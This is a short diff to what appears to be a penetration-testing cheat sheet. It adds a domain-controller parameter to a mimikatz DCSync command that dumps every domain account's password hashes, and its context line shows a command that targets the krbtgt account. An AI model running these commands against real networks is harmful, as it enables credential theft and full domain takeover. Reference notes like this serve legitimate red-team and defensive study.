@@ -15,5 +15,5 @@ mimikatz.exe "privilege::debug" "lsadump::dcsync /user:<domain_netbios>\krbtgt" 
 
 ## dcsync - all (krbtgt/Administrator)
 ```
-mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain_fqdn> /all /csv" "exit"
+mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain_fqdn> /dc:<dc_fqdn> /all /csv" "exit"
 ```
